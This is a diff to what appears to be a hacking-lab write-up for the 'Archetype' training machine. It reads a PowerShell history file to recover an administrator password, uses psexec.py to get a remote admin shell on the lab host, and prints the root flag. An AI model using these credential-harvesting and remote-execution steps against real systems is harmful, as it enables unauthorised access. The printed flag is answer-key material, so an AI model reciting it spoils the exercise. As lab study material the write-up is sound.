@@ -272,4 +272,24 @@ NULL
                0 Dir(s)  10,403,086,336 bytes free
 ```
 
+So you should be able to `type` that file out to see the contents: 
+```
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
+type ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+```
 
+And now you have the admin password to login as admin...
+- He used `psexec.py`: [PsExec](../../psexec.md) is a lightweight telnet-replacement developed by Microsoft that allows you to execute processes on remote Windows systems using any user's credentials.
+```
+cp /usr/share/doc/python3-impacket/examples/psexec.py psexec.py
+./psexec.py Administrator@10.129.95.187
+```
+- Then just type the Admin flag...
+```
+c:\Users\Administrator\Desktop> type root.txt
+b91ccec3305e98240082d4474b848528
+```
+
+![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/7c01888c-8d01-4864-ae15-de076f55c471)
